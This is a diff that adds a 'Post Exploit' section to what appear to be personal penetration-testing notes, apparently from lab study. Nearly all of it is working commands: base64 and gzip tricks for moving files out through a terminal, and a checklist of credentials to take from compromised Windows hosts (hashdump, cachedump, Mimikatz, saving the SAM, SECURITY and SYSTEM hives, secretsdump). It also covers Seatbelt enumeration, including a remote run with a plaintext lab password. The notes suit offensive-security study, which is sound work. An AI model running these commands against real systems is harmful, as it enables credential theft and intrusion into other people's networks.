@@ -259,7 +259,63 @@ use <first 2 of sessID>
 
 ===================================================================}}}
 
-{{{ Section: X ================================================================
+{{{ Section: Post Exploit ================================================================
+
+FTXER
+- HTTP: wget, HTTrack, Lynx, PIE(PWE-'asd')
+- netbios/ SMB
+- NFS
+- netcat 
+
+meterpreter
+edit <file> // downloads edits (vim) then reuploads
+
+// transfer ttp
+cat /bin/echo | gzip | base64 -w 0 
+- w 0 = disable line wrapping 
+
+
+// base64 doesn't fit terminal?
+ctrl - - - - - 
+
+// decode 
+"craptuns" | base64 -d | gzip > copy-of-binary 
+
+
+tar -zvcf - /some/directory/ | base64 -w 0; echo
+
+
+\\ ALWAYS grab these creds - 3 unique creds from every compromised domain-joined machine 
+        - domain + local + live creds
+Three things to always copy from a compromised domain-joined Windows machine:
+	1. Local credentials (hashdump / run hashdump)
+	2. Cached domain credentials (run post/windows/gather/cachedump)
+	3. Live credentials of logged-in users via Mimikatz (or similar) // SSO feature
+registry extra reg commands:
+reg save HKLM\SAM C:\Windows\Temp\SAM.hive
+reg save HKLM\Security C:\Windows\Temp\Security.hive
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
+Then process those registry hives on a machine with Impacket installed as follows: secretsdump.py -sam SAM.hive -system SYSTEM.hive -security Security.hive LOCAL
+
+
+\\ SEATBELT - lab
+# transfer seatbelt 
+Seatbelt.exe -q AntiVirus 
+Seatbelt.exe -q InstalledProducts
+Seatbelt.exe -q TcpConnections
+
+Seatbelt.exe -q -group=system // analyze System group - runs over 50 enum comms
+
+// remote commands +
+Seatbelt.exe -q | findstr +
+Seatbelt.exe -q UAC -computername=10.130.10.25 -username=hiboxy\bgreen -password=Password1
+
+
+
+
+
+
+
 
 
 
